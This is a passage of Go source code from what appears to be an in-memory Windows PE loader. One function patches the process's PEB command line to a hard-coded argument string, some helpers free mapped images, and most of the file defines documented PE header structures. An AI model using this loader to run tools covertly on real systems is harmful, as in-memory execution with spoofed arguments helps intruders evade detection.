// and then revert to old buffer once completed execution.
func FixExeParameters() error {
	ppeb := windows.RtlGetCurrentPeb()
	pparams := ppeb.ProcessParameters
	fmt.Printf("Address of PEB %x\n", unsafe.Pointer(ppeb))
	fmt.Printf("Address of commandline %x\n", unsafe.Pointer(pparams.CommandLine.Buffer))
	argv1Str := " coffee exit"
	argv1Length := len(argv1Str) * 2
	originalLength := pparams.CommandLine.MaximumLength
	argv1Ptr, err := windows.UTF16PtrFromString(argv1Str)
	spaceChecker, _ := syscall.UTF16PtrFromString(" ")
	if err != nil {
		return err
	}
	cBuff, err := winapi.VirtualAlloc(0, uint32(pparams.CommandLine.MaximumLength), winapi.MEM_COMMIT|winapi.MEM_RESERVE, winapi.PAGE_READWRITE)
	if err != nil {
		return err
	}
	var read uint32
	var wrote uint32
	ok, err := winapi.ReadProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), uintptr(unsafe.Pointer(pparams.CommandLine.Buffer)), cBuff, uint32(pparams.CommandLine.MaximumLength), &read)
	if !ok {
		return err
	}
	argv0Counter := 0
	for {
		// while not a space
		if *(*uint16)(unsafe.Pointer(cBuff)) == *spaceChecker {
			break
		}
		argv0Counter++
		cBuff++
	}
	fmt.Printf("GOT LENGTH OF ARGV0 %d\n", argv0Counter)
	offsetToEndOfArg0 := (uintptr)(unsafe.Pointer(pparams.CommandLine.Buffer)) + uintptr(argv0Counter)
	ok, err = winapi.WriteProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), offsetToEndOfArg0, uintptr((unsafe.Pointer(argv1Ptr))), uint32(argv1Length), &wrote)
	if !ok {
		return err
	}
	fmt.Printf("WROTE %d bytes\n", wrote)
	for x := 0; x < int(wrote); x++ {
		argv0Counter++
	}
	// zero the rest of the memory out
	zeroBuffer := make([]byte, uint32(originalLength)-uint32(argv0Counter))
	ok, err = winapi.WriteProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), offsetToEndOfArg0+uintptr(wrote), uintptr(unsafe.Pointer(&zeroBuffer[0])), uint32(originalLength)-uint32(argv0Counter), &wrote)
	if !ok {
		return err
	}
	fmt.Printf("ZEROED %d bytes\n", wrote)
	//pparams.CommandLine.Buffer = argv1Ptr
	pparams.CommandLine.MaximumLength = uint16(argv0Counter)
	pparams.CommandLine.Length = uint16(argv0Counter)
	fmt.Println(pparams.CommandLine.MaximumLength)
	return nil
}

func (r *RawPe) FreePeFromMemory() error {
	for _, a := range r.allocationAddresses {
		winapi.VirtualFree(a, 0, winapi.MEM_RELEASE)
	}
	return nil
}
func (r *RawPe) FreePeDllFromMemory() error {
	// calling dll detach.
	syscall.Syscall(r.peEntry, 3, r.allocatedMemoryBase, 0, 0)
	for _, a := range r.allocationAddresses {
		winapi.VirtualFree(a, 0, winapi.MEM_RELEASE)
	}
	return nil
}

func DosHeaderCheck(rawPeFileData []byte) bool {
	dosHeaderStruct := (*ImageDOSHeader)(unsafe.Pointer(&rawPeFileData[0]))
	if dosHeaderStruct.Magic != IMAGE_DOS_SIGNATURE {
		return false
	}
	return true
}

/////

type IMAGE_TLS_DIRECTORY struct {
	StartAddressOfRawData uintptr
	EndAddressOfRawData   uintptr
	AddressOfIndex        uintptr // PDWORD
	AddressOfCallbacks    uintptr // PIMAGE_TLS_CALLBACK *;
	SizeOfZeroFill        uint32
	Characteristics       uint32
}

// ImageNtHeader represents the PE header and is the general term for a structure
// named IMAGE_NT_HEADERS.
type ImageNtHeader struct {
	// Signature is a DWORD containing the value 50h, 45h, 00h, 00h.
	Signature uint32

	// IMAGE_NT_HEADERS privdes a standard COFF header. It is located
	// immediately after the PE signature. The COFF header provides the most
	// general characteristics of a PE/COFF file, applicable to both object and
	// executable files. It is represented with IMAGE_FILE_HEADER structure.
	FileHeader ImageFileHeader

	// OptionalHeader is of type *OptionalHeader32 or *OptionalHeader64.
	OptionalHeader interface{}
}

// ImageFileHeader contains infos about the physical layout and properties of the
// file.
type ImageFileHeader struct {
	// The number that identifies the type of target machine.
	Machine uint16

	// The number of sections. This indicates the size of the section table,
	// which immediately follows the headers.
	NumberOfSections uint16

	// // The low 32 bits of the number of seconds since 00:00 January 1, 1970
	// (a C run-time time_t value), that indicates when the file was created.
	TimeDateStamp uint32

	// // The file offset of the COFF symbol table, or zero if no COFF symbol
	// table is present. This value should be zero for an image because COFF
	// debugging information is deprecated.
	PointerToSymbolTable uint32

	// The number of entries in the symbol table. This data can be used to
	// locate the string table, which immediately follows the symbol table.
	// This value should be zero for an image because COFF debugging information
	// is deprecated.
	NumberOfSymbols uint32

	// The size of the optional header, which is required for executable files
	// but not for object files. This value should be zero for an object file.
	SizeOfOptionalHeader uint16

	// The flags that indicate the attributes of the file.
	Characteristics uint16
}

// ImageOptionalHeader32 represents the PE32 format structure of the optional header.
// PE32 contains this additional field, which is absent in PE32+.
type ImageOptionalHeader32 struct {

	// The unsigned integer that identifies the state of the image file.
	// The most common number is 0x10B, which identifies it as a normal
	// executable file. 0x107 identifies it as a ROM image, and 0x20B identifies
	// it as a PE32+ executable.
	Magic uint16

	// Linker major version number. The VC++ linker sets this field to current
	// version of Visual Studio.
	MajorLinkerVersion uint8

	// The linker minor version number.
	MinorLinkerVersion uint8

	// The size of the code (text) section, or the sum of all code sections
	// if there are multiple sections.
	SizeOfCode uint32

	// The size of the initialized data section (held in the field SizeOfRawData
	// of the respective section header), or the sum of all such sections if
	// there are multiple data sections.
	SizeOfInitializedData uint32

	// The size of the uninitialized data section (BSS), or the sum of all
	// such sections if there are multiple BSS sections. This data is not part
	// of the disk file and does not have specific values, but the OS loader
	// commits memory space for this data when the file is loaded.
	SizeOfUninitializedData uint32

	// The address of the entry point relative to the image base when the
	// executable file is loaded into memory. For program images, this is the
	// starting address. For device drivers, this is the address of the
	// initialization function. An entry point is optional for DLLs. When no
	// entry point is present, this field must be zero. For managed PE files,
	// this value always points to the common language runtime invocation stub.
	AddressOfEntryPoint uint32

	// The address that is relative to the image base of the beginning-of-code
	// section when it is loaded into memory.
	BaseOfCode uint32

	// The address that is relative to the image base of the beginning-of-data
	// section when it is loaded into memory.This entry doesn’t exist in the
	// 64-bit Optional header.
	BaseOfData uint32

	// The preferred address of the first byte of image when loaded into memory;
	// must be a multiple of 64 K. The default for DLLs is 0x10000000. The
	// default for Windows CE EXEs is 0x00010000. The default for Windows NT,
	// Windows 2000, Windows XP, Windows 95, Windows 98, and Windows Me is
	// 0x00400000.
	ImageBase uint32

	// The alignment (in bytes) of sections when they are loaded into memory.
	// It must be greater than or equal to FileAlignment. The default is the
	// page size for the architecture.
	SectionAlignment uint32

	// The alignment factor (in bytes) that is used to align the raw data of
	// sections in the image file. The value should be a power of 2 between 512
	// and 64 K, inclusive. The default is 512. If the SectionAlignment is less
	// than the architecture's page size, then FileAlignment must match
	// SectionAlignment.
	FileAlignment uint32

	// The major version number of the required operating system.
	MajorOperatingSystemVersion uint16

	// The minor version number of the required operating system.
	MinorOperatingSystemVersion uint16

	// The major version number of the image.
	MajorImageVersion uint16

	// The minor version number of the image.
	MinorImageVersion uint16

	// The major version number of the subsystem.
	MajorSubsystemVersion uint16

	// The minor version number of the subsystem.
	MinorSubsystemVersion uint16

	// Reserved, must be zero.
	Win32VersionValue uint32

	// The size (in bytes) of the image, including all headers, as the image
	// is loaded in memory. It must be a multiple of SectionAlignment.
	SizeOfImage uint32

	// The combined size of an MS-DOS stub, PE header, and section headers
	// rounded up to a multiple of FileAlignment.
	SizeOfHeaders uint32

	// The image file checksum. The algorithm for computing the checksum is
	// incorporated into IMAGHELP.DLL. The following are checked for validation
	// at load time: all drivers, any DLL loaded at boot time, and any DLL
	// that is loaded into a critical Windows process.
	CheckSum uint32

	// The subsystem that is required to run this image.
	Subsystem uint16

	// For more information, see DLL Characteristics later in this specification.
	DllCharacteristics uint16

	// Size of virtual memory to reserve for the initial thread’s stack. Only
	// the SizeOfStackCommit field is committed; the rest is available in
	// one-page increments. The default is 1MB for 32-bit images and 4MB for
	// 64-bit images.
	SizeOfStackReserve uint32

	// Size of virtual memory initially committed for the initial thread’s
	// stack. The default is one page (4KB) for 32-bit images and 16KB for
	// 64-bit images.
	SizeOfStackCommit uint32

	// size of the local heap space to reserve. Only SizeOfHeapCommit is
	// committed; the rest is made available one page at a time until the
	// reserve size is reached. The default is 1MB for both 32-bit and 64-bit
	// images.
	SizeOfHeapReserve uint32

	// Size of virtual memory initially committed for the process heap. The
	// default is 4KB (one operating system memory page) for 32-bit images and
	// 16KB for 64-bit images.
	SizeOfHeapCommit uint32

	// Reserved, must be zero.
	LoaderFlags uint32

	// Number of entries in the DataDirectory array; at least 16. Although it
	// is theoretically possible to emit more than 16 data directories, all
	// existing managed compilers emit exactly 16 data directories, with the
	// 16th (last) data directory never used (reserved).
	NumberOfRvaAndSizes uint32

	// An array of 16 IMAGE_DATA_DIRECTORY structures.
	DataDirectory [16]DataDirectory
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

// ImageOptionalHeader64 represents the PE32+ format structure of the optional header.
type ImageOptionalHeader64 struct {
	// The unsigned integer that identifies the state of the image file.
	// The most common number is 0x10B, which identifies it as a normal
	// executable file. 0x107 identifies it as a ROM image, and 0x20B identifies
	// it as a PE32+ executable.
	Magic uint16

	// Linker major version number. The VC++ linker sets this field to current
	// version of Visual Studio.
	MajorLinkerVersion uint8

	// The linker minor version number.
	MinorLinkerVersion uint8

	// The size of the code (text) section, or the sum of all code sections
	// if there are multiple sections.
	SizeOfCode uint32

	// The size of the initialized data section (held in the field SizeOfRawData
	// of the respective section header), or the sum of all such sections if
	// there are multiple data sections.
	SizeOfInitializedData uint32

	// The size of the uninitialized data section (BSS), or the sum of all
	// such sections if there are multiple BSS sections. This data is not part
	// of the disk file and does not have specific values, but the OS loader
	// commits memory space for this data when the file is loaded.
	SizeOfUninitializedData uint32

	// The address of the entry point relative to the image base when the
	// executable file is loaded into memory. For program images, this is the
	// starting address. For device drivers, this is the address of the
	// initialization function. An entry point is optional for DLLs. When no
	// entry point is present, this field must be zero. For managed PE files,
	// this value always points to the common language runtime invocation stub.
	AddressOfEntryPoint uint32

	// The address that is relative to the image base of the beginning-of-code
	// section when it is loaded into memory.
	BaseOfCode uint32

	// In PE+, ImageBase is 8 bytes size.
	ImageBase uint64

	// The alignment (in bytes) of sections when they are loaded into memory.
	// It must be greater than or equal to FileAlignment. The default is the
	// page size for the architecture.
	SectionAlignment uint32

	// The alignment factor (in bytes) that is used to align the raw data of
	// sections in the image file. The value should be a power of 2 between 512
	// and 64 K, inclusive. The default is 512. If the SectionAlignment is less
	// than the architecture's page size, then FileAlignment must match SectionAlignment.
	FileAlignment uint32

	// The major version number of the required operating system.
	MajorOperatingSystemVersion uint16

	// The minor version number of the required operating system.
	MinorOperatingSystemVersion uint16

	// The major version number of the image.
	MajorImageVersion uint16

	// The minor version number of the image.
	MinorImageVersion uint16

	// The major version number of the subsystem.
	MajorSubsystemVersion uint16

	// The minor version number of the subsystem.
	MinorSubsystemVersion uint16

	// Reserved, must be zero.
	Win32VersionValue uint32

	// The size (in bytes) of the image, including all headers, as the image
	// is loaded in memory. It must be a multiple of SectionAlignment.
	SizeOfImage uint32

	// The combined size of an MS-DOS stub, PE header, and section headers
	// rounded up to a multiple of FileAlignment.
	SizeOfHeaders uint32

	// The image file checksum. The algorithm for computing the checksum is
	// incorporated into IMAGHELP.DLL. The following are checked for validation
	// at load time: all drivers, any DLL loaded at boot time, and any DLL
	// that is loaded into a critical Windows process.
	CheckSum uint32

	// The subsystem that is required to run this image.
	Subsystem uint16

	// For more information, see DLL Characteristics later in this specification.
	DllCharacteristics uint16

	// Size of virtual memory to reserve for the initial thread’s stack. Only
	// the SizeOfStackCommit field is committed; the rest is available in
	// one-page increments. The default is 1MB for 32-bit images and 4MB for
	// 64-bit images.
	SizeOfStackReserve uint64

	// Size of virtual memory initially committed for the initial thread’s
	// stack. The default is one page (4KB) for 32-bit images and 16KB for
	// 64-bit images.
	SizeOfStackCommit uint64

	// size of the local heap space to reserve. Only SizeOfHeapCommit is
	// committed; the rest is made available one page at a time until the
	// reserve size is reached. The default is 1MB for both 32-bit and 64-bit
	// images.
	SizeOfHeapReserve uint64

	// Size of virtual memory initially committed for the process heap. The
	// default is 4KB (one operating system memory page) for 32-bit images and
	// 16KB for 64-bit images.
	SizeOfHeapCommit uint64

	// Reserved, must be zero.
	LoaderFlags uint32

	// Number of entries in the DataDirectory array; at least 16. Although it
	// is theoretically possible to emit more than 16 data directories, all
	// existing managed compilers emit exactly 16 data directories, with the
	// 16th (last) data directory never used (reserved).
	NumberOfRvaAndSizes uint32

	// An array of 16 IMAGE_DATA_DIRECTORY structures.
	DataDirectory [16]DataDirectory
}

// DataDirectory represents an array of 16 IMAGE_DATA_DIRECTORY structures,
// 8 bytes apiece, each relating to an important data structure in the PE file.
// The data directory table starts at offset 96 in a 32-bit PE header and at
// offset 112 in a 64-bit PE header. Each entry in the data directory table
// contains the RVA and size of a table or a string that this particular
// directory entry describes;this information is used by the operating system.
type DataDirectory struct {
	VirtualAddress uint32 // The RVA of the data structure.
	Size           uint32 // The size in bytes of the data structure refered to.
}

type ImageExportDirectory struct {
	Characteristics       uint32 // always 0
	TimeDateStamp         uint32 // create file time
	MajorVersion          uint16 // always 0
	MinorVersion          uint16 // always 0
	Name                  uint32 // pointer of dll name ascii string rva
	Base                  uint32 // number of function
	NumberOfFunctions     uint32 // function total
	NumberOfNames         uint32 //
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}
